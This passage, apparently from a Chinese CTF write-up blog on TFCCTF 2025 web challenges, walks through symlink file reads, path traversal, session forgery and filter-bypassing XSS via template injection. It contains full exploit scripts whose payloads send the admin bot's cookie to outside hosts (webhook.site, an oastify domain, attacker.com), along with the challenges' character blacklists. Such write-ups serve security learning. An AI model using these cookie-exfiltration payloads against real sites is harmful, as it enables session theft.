class="string">&#x27;/files&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>验证发现，此处通过软链接可以读取任意文件内容。可以通过软链接flag.txt，但不知道flag文件存在的目录</p>
<p>查看其它处理代码，访问 <code>/debug/files</code> 时，相关的处理代码存在路径穿越漏洞</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/debug/files&#x27;</span>, developmentOnly, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// session_id 存在路径穿越，可以获取任意目录下的文件列表</span></span><br><span class="line">    <span class="keyword">const</span> userDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../uploads&#x27;</span>, req.<span class="property">query</span>.<span class="property">session_id</span>);</span><br><span class="line">    fs.<span class="title function_">readdir</span>(userDir, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Error reading files&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;files&#x27;</span>, &#123; files &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>但是访问该 <code>url</code> 需要先通过 <code>developmentOnly()</code> 方法的认证，条件时 <code>userId === ‘develop’</code> ，且 <code>req.ip == ‘127.0.0.1’</code></p>
<p>后者通过修改 <code>X-Forwarded-For</code> 可以满足，下面分析 <code>userId === ‘develop’</code> 的问题</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">userId</span> === <span class="string">&#x27;develop&#x27;</span> &amp;&amp; req.<span class="property">ip</span> == <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">next</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Forbidden: Development access only&#x27;</span>);</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<p>调试发现，<code>userId</code>是一串随机字符</p>
<p><img src="/image-20250901100930140.png" alt="image-20250901100930140"></p>
<p>发现 server.js 中有存放 develop 的sessionData：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Session</span></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> session.<span class="title class_">MemoryStore</span>();</span><br><span class="line"><span class="keyword">const</span> sessionData = &#123;</span><br><span class="line">    <span class="attr">cookie</span>: &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">      <span class="attr">httpOnly</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">maxAge</span>: <span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">48</span> <span class="comment">// 1 hour</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">userId</span>: <span class="string">&#x27;develop&#x27;</span>   <span class="comment">// 用户名为 develop</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// store.set 保存sessionData的值</span></span><br><span class="line">store.<span class="title function_">set</span>(<span class="string">&#x27;&lt;REDACTED&gt;&#x27;</span>, sessionData, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Failed to create develop session:&#x27;</span>, err);</span><br><span class="line">    <span class="keyword">else</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Development session created!&#x27;</span>);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>可以通过前面的软链接读取 <code>server.js</code> ，进而获取保存的 <code>sessiondata</code></p>
<p>然后使用 <code>sha256</code> 计算得到 <code>develop</code> 的 <code>userId</code> </p>
<p>然后通过访问 <code>/debug/files</code> 获取存放 flag.txt 的目录名，然后再通过软件读取</p>
<p>获取FLAG的思路如下：</p>
<ol>
<li><p>软链接读取 <code>/app/.env</code> 和 <code>/app/server.js</code>，获取 <code>SESSION_SECRET</code> 和 <code>develop</code>的<code>sessionData</code></p>
</li>
<li><p><code>hmac</code> 计算 <code>develop</code> 的 <code>userId</code>，修改<code>host</code>为<code>127.0.0.1</code>，修改<code>cookie</code>为计算出的<code>userId</code>，访问 <code>debug/files</code> 利用路径穿越漏洞获取存放 <code>flag.txt</code> 的目录</p>
</li>
</ol>
<p><img src="/image-20250901105312884.png" alt="image-20250901105312884"></p>
<p>存放flag.txt的目录：</p>
<style>.rkzqpezyxxsm{zoom:80%;}</style><img src="/2025/09/02/TFCCTF2025/image-20250901105053972.png" class="rkzqpezyxxsm" alt="image-20250901105053972">

<ol start="3">
<li>利用软链接读取 &#x2F;tlhedn6f&#x2F;flag.txt 文件，获取FLAG</li>
<li><style>.wszzjjveyies{zoom:80%;}</style><img src="/2025/09/02/TFCCTF2025/image-20250901105617324.png" class="wszzjjveyies" alt="image-20250901105617324"></li>
</ol>
<h3 id="KISSFIXESS"><a href="#KISSFIXESS" class="headerlink" title="KISSFIXESS"></a>KISSFIXESS</h3><p><strong>一、题目描述</strong></p>
<p>模板渲染，用户输入 Name ，服务端渲染成不同颜色</p>
<style>.hvgeytvrtwtl{zoom:80%;}</style><img src="/2025/09/02/TFCCTF2025/image-20250901211720915.png" class="hvgeytvrtwtl" alt="image-20250901211720915">

<p>分析源码发现，模拟管理员访问<code>URL</code>的机器人 bot.py，显示 <code>flag</code> 被当作<code>cookie</code>存放</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">driver.add_cookie(&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;TFCCTF&#123;~&#125;&quot;</span>,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><strong>二、题目分析</strong></p>
<p>通过源码分析，该服务端使用 <code>http.server</code> + <code>Mako</code> 模板渲染，用户输入通过 GET 请求 <code>name_input</code> 参数提交，页面上有一个  “Report Name” 按钮，点击后会发 POST 请求 <code>/report</code>。<code>/report</code> 处理函数会调用 机器人 <code>bot.py</code> 的 <code>visit_url</code> 函数访问指定 URL。</p>
<p>用户输入<code>Name</code>被保存在变量 <code>name_to_display</code> ，在渲染之前有2处过滤：</p>
<p><code>banned</code> 黑名单字符</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 禁止危险字符</span></span><br><span class="line">banned = [<span class="string">&quot;s&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;|&quot;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment"># 过滤危险字符，不能使用 self,(),.,import等</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> banned:</span><br><span class="line">        <span class="keyword">if</span> b <span class="keyword">in</span> name:</span><br><span class="line">            name = <span class="string">&quot;Banned characters detected!&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(b)</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment"># render_page函数调用escape_html，后者在渲染页面时禁止 “&amp;&lt;&gt;()”</span></span><br><span class="line">    <span class="variable language_">self</span>.wfile.write(render_page(name_to_display=name).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>**绕过：**L和S，JS语言的Function构造器（<code>Function(&quot;...&quot;)()</code> 会把字符串里的代码当成 JavaScript 来运行）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&quot;console.log(&#x27;hi&#x27;)&quot;</span>)()</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;hi&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><code>escape_html</code> 函数： 对用户输入的字符串进行转义（escape），以防止浏览器把它当成 <code>HTML</code> 或 <code>JavaScript</code> 解析，防止<code>XSS</code>攻击</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">escape_html</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Escapes HTML special characters in the given text.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;.replace(&quot;&amp;&quot;, &quot;&amp;amp;&quot;)   # 把 &amp; 转义为 &amp;amp;</span></span><br><span class="line"><span class="string">       .replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;)    # 把 &lt; 转义为 &amp;lt;  (防止开始标签)</span></span><br><span class="line"><span class="string">       .replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;)    # 把 &gt; 转义为 &amp;gt;  (防止结束标签)</span></span><br><span class="line"><span class="string">       .replace(&quot;(&quot;, &quot;&amp;#40;&quot;)   # 把 ( 转义为 &amp;#40; (避免JS函数调用)</span></span><br><span class="line"><span class="string">       .replace(&quot;)&quot;, &quot;&amp;#41;&quot;))  # 把 ) 转义为 &amp;#41;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> text.replace(<span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;&amp;amp;&quot;</span>).replace(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>).replace(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>).replace(<span class="string">&quot;(&quot;</span>, <span class="string">&quot;&amp;#40;&quot;</span>).replace(<span class="string">&quot;)&quot;</span>, <span class="string">&quot;&amp;#41;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>然后被过滤或转义的 <code>name_to_display</code> 被当作参数，传入<code>template.render</code>函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">name_to_display=<span class="literal">None</span></span>):</span><br><span class="line">    templ = html_template.replace(<span class="string">&quot;NAME&quot;</span>, escape_html(name_to_display <span class="keyword">or</span> <span class="string">&quot;&quot;</span>))</span><br><span class="line">    template = Template(templ, lookup=lookup)</span><br><span class="line">    <span class="keyword">return</span> template.render(name_to_display=name_to_display, banned=<span class="string">&quot;&amp;&lt;&gt;()&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>**绕过：**构造映射关系</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mapping = &#123;</span><br><span class="line">    <span class="string">&quot;&amp;&quot;</span>: <span class="string">&quot;$&#123;banned[0]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;&quot;</span>: <span class="string">&quot;$&#123;banned[1]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;&quot;</span>: <span class="string">&quot;$&#123;banned[2]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(&quot;</span>: <span class="string">&quot;$&#123;banned[3]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;)&quot;</span>: <span class="string">&quot;$&#123;banned[4]&#125;&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过精心构造，用户输入<code>name_to_display</code>可以走到页面渲染<code>template.render</code>函数，存在SSTI</p>
<p>**解题思路：**利用SSTI漏洞将恶意链接（作用是获取网页Cookie并发送到指定域名）渲染到服务端返回的HTML中，然后通过POST请求 <code>/report</code>调用机器人访问该恶意链接，将机器人的Cookie（即flag）发送到指定域名</p>
<p>构造payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">&quot;  https://webhook.site/0b99fcd3-6f53-4906-889a-3e7fd8b19a84/?x=&quot;</span>)+document.cookie</span><br></pre></td></tr></table></figure>

<p>当浏览器执行这段代码时，就会把用户 Cookie 传送到 <code>https://webhook.site/0b99fcd3-6f53-4906-889a-3e7fd8b19a84</code></p>
<p>通过加入<code>空格</code>绕过base64编码后存在 <code>l</code> 和 <code>s</code> 的问题，使用上述绕过方法，最终的payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;banned[1]&#125;SCRIPT$&#123;banned[2]&#125;Function$&#123;banned[3]&#125;atob$&#123;banned[3]&#125;`ICBmZXRjaCgnaHR0cHM6Ly93ZWJob29rLnNpdGUvMGI5OWZjZDMtNmY1My00OTA2LTg4OWEtM2U3ZmQ4YjE5YTg0Lz92Yz0nK2RvY3VtZW50LmNvb2tpZSkg`$&#123;banned[4]&#125;$&#123;banned[4]&#125;$&#123;banned[3]&#125;$&#123;banned[4]&#125;$&#123;banned[1]&#125;/SCRIPT$&#123;banned[2]&#125;</span><br></pre></td></tr></table></figure>

<p>将payload作为Name输入，服务器端返回的页面包含：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;fetch(&#x27;https://attacker.com?x=&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>机器人bot.py访问该页面时：HTML 被解析，<code>&lt;iframe&gt;</code> 加载时触发 <code>onload</code>，<code>fetch()</code> 调用执行，浏览器（或机器人）发送 cookie 到指定域名，获取cookie</p>
<p><img src="/76564239253c115e5fd5196ea43a8f5.png" alt="76564239253c115e5fd5196ea43a8f5"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">mapping = &#123;</span><br><span class="line">    <span class="string">&quot;&amp;&quot;</span>: <span class="string">&quot;$&#123;banned[0]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;&quot;</span>: <span class="string">&quot;$&#123;banned[1]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;&quot;</span>: <span class="string">&quot;$&#123;banned[2]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(&quot;</span>: <span class="string">&quot;$&#123;banned[3]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;)&quot;</span>: <span class="string">&quot;$&#123;banned[4]&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">js_inner = <span class="string">&#x27;fetch(&quot;  https://webhook.site/0b99fcd3-6f53-4906-889a-3e7fd8b19a84/?x=&quot;)+document.cookie&#x27;</span></span><br><span class="line">js_base = base64.b64encode(js_inner.encode()).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">js = <span class="string">f&quot;&quot;&quot;Function(atob(`<span class="subst">&#123;js_base&#125;</span>`))()&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(js)</span><br><span class="line"></span><br><span class="line">to_enc = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;iframe onLoad=&#x27;JAVASCRIPT:<span class="subst">&#123;js&#125;</span>&#x27; &gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(to_enc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;*&quot;</span>*<span class="number">25</span>)</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> mapping.keys():</span><br><span class="line">    to_enc = to_enc.replace(key, mapping[key])</span><br><span class="line"><span class="built_in">print</span>(to_enc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">15</span>)</span><br><span class="line">banned = [<span class="string">&quot;s&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;|&quot;</span>]</span><br><span class="line"></span><br><span class="line">ban_doesnt_trigger = <span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> banned:</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">in</span> to_enc:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;BAN | <span class="subst">&#123;c&#125;</span> | found&#x27;</span>)</span><br><span class="line">        ban_doesnt_trigger= <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> ban_doesnt_trigger:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;All good&quot;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="KISSFIXSSREVENGE"><a href="#KISSFIXSSREVENGE" class="headerlink" title="KISSFIXSSREVENGE"></a>KISSFIXSSREVENGE</h3><p>过滤条件更严格</p>
<p><code>banned</code> 黑名单字符</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">KISSFIXESS</span></span><br><span class="line">banned = [&quot;s&quot;, &quot;l&quot;, &quot;(&quot;, &quot;)&quot;, &quot;self&quot;, &quot;_&quot;, &quot;.&quot;, &quot;\&quot;&quot;, &quot;\\&quot;, &quot;import&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;os&quot;, &quot;;&quot;, &quot;,&quot;, &quot;|&quot;]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">KISSFIXESSREVENGE</span></span><br><span class="line">banned = [&quot;s&quot;, &quot;l&quot;, &quot;(&quot;, &quot;)&quot;, &quot;self&quot;, &quot;_&quot;, &quot;.&quot;, &quot;\&quot;&quot;, &quot;\\&quot;, &quot;&amp;&quot;, &quot;%&quot;, &quot;^&quot;, &quot;#&quot;, &quot;@&quot;, &quot;!&quot;, &quot;*&quot;, &quot;-&quot;, &quot;import&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;os&quot;, &quot;;&quot;, &quot;,&quot;, &quot;|&quot;, &quot;JAVASCRIPT&quot;, &quot;window&quot;, &quot;atob&quot;, &quot;btoa&quot;, &quot;=&quot;]</span><br></pre></td></tr></table></figure>

<p>绕过方法：</p>
<ol>
<li>大小写：<code>L</code>和<code>S</code></li>
<li><code>JS</code>语言的<code>Function</code>构造器：<code>Function(&quot;...&quot;)()</code> 会把字符串里的代码当成 JavaScript 来运行</li>
<li><code>mapping</code>映射：</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mapping = &#123;</span><br><span class="line">    <span class="string">&quot;&amp;&quot;</span>: <span class="string">&quot;$&#123;banned[0]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;&quot;</span>: <span class="string">&quot;$&#123;banned[1]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;&quot;</span>: <span class="string">&quot;$&#123;banned[2]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(&quot;</span>: <span class="string">&quot;$&#123;banned[3]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;)&quot;</span>: <span class="string">&quot;$&#123;banned[4]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;atob&quot;</span>: <span class="string">&quot;at$&#123;&#x27;o&#x27;&#125;b&quot;</span>,</span><br><span class="line">    <span class="string">&quot;JAVASCRIPT&quot;</span>: <span class="string">&quot;JAVA$&#123;&#x27;S&#x27;&#125;CRIPT&quot;</span>,</span><br><span class="line">    <span class="comment"># &quot;=&quot;: &quot;&amp;#61&quot;,</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终的exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">mapping = &#123;</span><br><span class="line">    <span class="string">&quot;&amp;&quot;</span>: <span class="string">&quot;$&#123;banned[0]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;&quot;</span>: <span class="string">&quot;$&#123;banned[1]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;&quot;</span>: <span class="string">&quot;$&#123;banned[2]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(&quot;</span>: <span class="string">&quot;$&#123;banned[3]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;)&quot;</span>: <span class="string">&quot;$&#123;banned[4]&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;atob&quot;</span>: <span class="string">&quot;at$&#123;&#x27;o&#x27;&#125;b&quot;</span>,</span><br><span class="line">    <span class="string">&quot;JAVASCRIPT&quot;</span>: <span class="string">&quot;JAVA$&#123;&#x27;S&#x27;&#125;CRIPT&quot;</span>,</span><br><span class="line">    <span class="comment"># &quot;=&quot;: &quot;&amp;#61&quot;,</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sum to remove `l` char in base64</span></span><br><span class="line">js_inner = <span class="string">&quot;  fetch(&#x27;https://m5s9ag1y50zj7a69toy64m&#x27; + &#x27;7l7cd31zxnm.oastify.com/?x=&#x27;+document.cookie) &quot;</span></span><br><span class="line">js_base = base64.b64encode(js_inner.encode()).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">js = <span class="string">f&quot;&quot;&quot;Function(atob(`<span class="subst">&#123;js_base&#125;</span>`))()&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(js)</span><br><span class="line"></span><br><span class="line">to_enc = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;SCRIPT&gt;<span class="subst">&#123;js&#125;</span>&lt;/SCRIPT&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> mapping.keys():</span><br><span class="line">        to_enc = to_enc.replace(key, mapping[key])</span><br><span class="line"><span class="built_in">print</span>(to_enc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================================</span></span><br><span class="line"><span class="comment"># (Blocked chars check)</span></span><br><span class="line"><span class="comment"># Not exploit</span></span><br><span class="line"><span class="comment"># ================================</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">15</span>)</span><br><span class="line">banned = [<span class="string">&quot;s&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;#&quot;</span>, <span class="string">&quot;@&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;import&quot;</span>,</span><br><span class="line">          <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;JAVASCRIPT&quot;</span>, <span class="string">&quot;window&quot;</span>, <span class="string">&quot;atob&quot;</span>, <span class="string">&quot;btoa&quot;</span>, <span class="string">&quot;=&quot;</span>]</span><br><span class="line"></span><br><span class="line">ban_doesnt_trigger = <span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> banned:</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">in</span> to_enc:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;BAN | <span class="subst">&#123;c&#125;</span> | found&#x27;</span>)</span><br><span class="line">        ban_doesnt_trigger= <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> ban_doesnt_trigger:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;All good&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="WEBLESS"><a href="#WEBLESS" class="headerlink" title="WEBLESS"></a>WEBLESS</h3><p><strong>一、题目描述</strong></p>
